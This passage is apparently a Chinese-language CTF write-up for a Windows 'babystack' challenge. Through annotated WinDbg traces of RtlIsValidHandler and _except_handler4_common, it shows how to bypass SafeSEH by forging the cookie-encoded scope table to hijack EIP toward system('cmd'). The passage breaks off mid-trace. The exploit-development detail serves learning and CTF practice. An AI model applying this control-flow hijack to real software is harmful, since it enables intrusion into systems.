    eax=000a3390 ebx=0000138d ecx=00000000 edx=00000000 esi=00000001 edi=00000000
    eip=7708f86c esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl zr na pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000247
    ntdll!RtlIsValidHandler+0x54:
    7708f86c 8b3c88          mov     edi,dword ptr [eax+ecx*4] ds:0023:000a3390=00001460//从safeseh handler table中获取可信的seh handler
    0:000> p
    eax=000a3390 ebx=0000138d ecx=00000000 edx=00000000 esi=00000001 edi=00001460
    eip=7708f86f esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei pl zr na pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000247
    ntdll!RtlIsValidHandler+0x57:
    7708f86f 3bdf            cmp     ebx,edi//用可信seh handler和当前seh handler作比较
    0:000> p
    eax=000a3390 ebx=0000138d ecx=00000000 edx=00000000 esi=00000001 edi=00001460
    eip=7708f871 esp=0028f4ac ebp=0028f4e8 iopl=0         nv up ei ng nz na pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
    ntdll!RtlIsValidHandler+0x59://显然不相等，跳转
    7708f871 0f8274030000    jb      ntdll!RtlIsValidHandler+0x5b (7708fbeb) [br=1]
这里用当前 system('cmd') 地址的 seh handler 和 safeseh table 中可信的 handler
作比较，显然由于我们的覆盖，不相等，则 safeseh check 没通过，返回0。
    0:000> p
    eax=64fd5e00 ebx=0028faa0 ecx=64d5aa92 edx=00000000 esi=0028f580 edi=00000000
    eip=7708f88d esp=0028f4ec ebp=0028f568 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlIsValidHandler+0xfc:
    7708f88d c20800          ret     8
    0:000> p
    eax=64fd5e00 ebx=0028faa0 ecx=64d5aa92 edx=00000000 esi=0028f580 edi=00000000
    eip=7708f9fe esp=0028f4f8 ebp=0028f568 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlDispatchException+0x10e:
    7708f9fe 84c0            test    al,al
    0:000> r al
    al=0
在 babyshellcode 中，我们用了 nosafeseh 的 dll 突破了 safeseh，在 babystack 中我们没有 nosafeseh
的地址空间，也没有可用的堆空间（有也用不了），因此我们不能用 seh handler了，而我们可控的空间就是栈空间，我们有 scope
table，经过我们之前的分析，可以通过 scope table 实现对 eip 的控制。
因此，我们目前需要在栈泄露并 fix 的栈结构是 seh 的 prev 域和 handler 域。
之前我们分析 `except_handler4_comm` 函数时，发现处理到最后会跳转到 scope table 表中的 Handler func
指针指向的位置，因此我们利用 `except_handler4` 的机制就可以使用 scope table 中的 handler func 来控制
eip，而不使用 seh handler，也就是说将 seh chain 的 prev 域和 handler
域的值覆盖成和原来一样的（因为这两个值都可以泄露出来，之前提过），唯独控制 scope table 中的 struc，从而相当于绕过了 safe seh 的
RtlIsValidHandler 的 check。
    0:000> p
    eax=01101460 ebx=0012ff08 ecx=0012f91c edx=770b6c74 esi=0012f9c0 edi=00000000
    eip=7708f9f6 esp=0012f934 ebp=0012f9a8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    ntdll!RtlDispatchException+0x106:
    7708f9f6 ff7304          push    dword ptr [ebx+4]    ds:0023:0012ff0c=01101460
    0:000> p
    eax=01101460 ebx=0012ff08 ecx=0012f91c edx=770b6c74 esi=0012f9c0 edi=00000000
    eip=7708f9f9 esp=0012f930 ebp=0012f9a8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    ntdll!RtlDispatchException+0x109:
    7708f9f9 e815feffff      call    ntdll!RtlIsValidHandler (7708f813)
    0:000> p
    eax=01103301 ebx=0012ff08 ecx=711cbddc edx=00000000 esi=0012f9c0 edi=00000000
    eip=7708f9fe esp=0012f938 ebp=0012f9a8 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlDispatchException+0x10e:
    7708f9fe 84c0            test    al,al
    0:000> r al
    al=1
下面我们来看一下 scope table 该如何控制。
首先看我们之前的分析，在 scope table 位置存放的是 struc 和 security cookie 异或的结果，我们就叫它 encode
scope table，接下来我们跟入 `VCRUNTIME140!_except_handler4_common` 函数，首先会对 scope table
进行解密，也就是和 security cookie 进行异或运算。
    0:000> p//获得当前encode scope table
    eax=00000000 ebx=00000000 ecx=01274004 edx=770b6d8d esi=0027fc0c edi=00000000
    eip=606eb30a esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    VCRUNTIME140!_except_handler4_common+0x1a:
    606eb30a 8b7e08          mov     edi,dword ptr [esi+8] ds:0023:0027fc14=b24ab809
    0:000> p
    eax=00000000 ebx=00000000 ecx=01274004 edx=770b6d8d esi=0027fc0c edi=b24ab809
    eip=606eb30d esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    VCRUNTIME140!_except_handler4_common+0x1d:
    606eb30d 8d4610          lea     eax,[esi+10h]
    0:000> p//ecx的值是base address+0x4004，也就是security cookie的存放位置，edi是encode scope table，异或运算
    eax=0027fc1c ebx=00000000 ecx=01274004 edx=770b6d8d esi=0027fc0c edi=b24ab809
    eip=606eb310 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    VCRUNTIME140!_except_handler4_common+0x20:
    606eb310 3339            xor     edi,dword ptr [ecx]  ds:0023:01274004=b36d8e81
    0:000> p
    eax=0027fc1c ebx=00000000 ecx=01274004 edx=770b6d8d esi=0027fc0c edi=01273688//edi的值变成scope table的指针
    eip=606eb312 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    VCRUNTIME140!_except_handler4_common+0x22:
    606eb312 50              push    eax
注意 ecx 的值，指向的是当前进程地址 `+0x4004`，这个位置之前已经分析过存放的是全局变量 security
cookie，这个值我们可以能通过任意地址读获取到，而栈里对应 encode scope table 的值我们也能通过任意地址读获取到，因此我们就可以获取到
struc 的值，而这个 struc 的值，是我们可以决定的，如果我们用任意地址 xor security cookie 的值，这个 decode
之后的指针就能指向我们构造的地址了。
随后会检查 Try level 的值。
    0:000> p//获取try level的值
    eax=0027f598 ebx=0027f6dc ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
    eip=606eb344 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!_except_handler4_common+0x54:
    606eb344 8b5e0c          mov     ebx,dword ptr [esi+0Ch] ds:0023:0027fc18=00000000//esi的值需要注意
    0:000> p
    eax=0027f598 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
    eip=606eb347 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!_except_handler4_common+0x57:
    606eb347 8946fc          mov     dword ptr [esi-4],eax ds:0023:0027fc08=5be7a4e3
    0:000> p//将try leve的值和-2做比较，这里try level值为0
    eax=0027f598 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
    eip=606eb34a esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    VCRUNTIME140!_except_handler4_common+0x5a:
    606eb34a 83fbfe          cmp     ebx,0FFFFFFFEh
Try level 的值为0，这里会和-2作比较，如果 Try level 的值为-2的情况下会表示没有进入任何该函数的 try
模块中，程序会返回，这里由于程序一开始就将值赋值为0，因此这里会进入后续处理。
这里我们需要注意一下 esi 的值，这里 Try level 的值是由 esi+0C 赋值而来，来看下 esi 的值是啥。
    0:000> dd 0027fc0c
    0027fc0c  0027fc54 01271460 b24ab809 00000000
    0027fc1c  0027fc64 0127167a 00000001 003d7b60
    0027fc2c  003d7bb8 b34a72e5 00000000 00000000
    0027fc3c  7ffdb000 0027fc00 00000000 00000000
    0027fc4c  0027fc30 0000031b 0027fca0 01271460
    0027fc5c  b24ab829 00000000 0027fc70 76b2ef8c
    0027fc6c  7ffdb000 0027fcb0 770d367a 7ffdb000
    0027fc7c  637cd233 00000000 00000000 7ffdb000
    0:000> !exchain
    0027f5ec: ntdll!ExecuteHandler2+3a (770b6d8d)
    0027fc0c: babystack+1460 (01271460)
    0027fc54: babystack+1460 (01271460)
可以看到，esi 的值就在 seh chain 中，接下来我们继续跟踪 `VCRUNTIME140!_except_handler4_common` 函数。
    0:000> p
    eax=0027f598 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
    eip=606eb353 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
    VCRUNTIME140!_except_handler4_common+0x63:
    606eb353 8d4302          lea     eax,[ebx+2]
    0:000> p
    eax=00000002 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688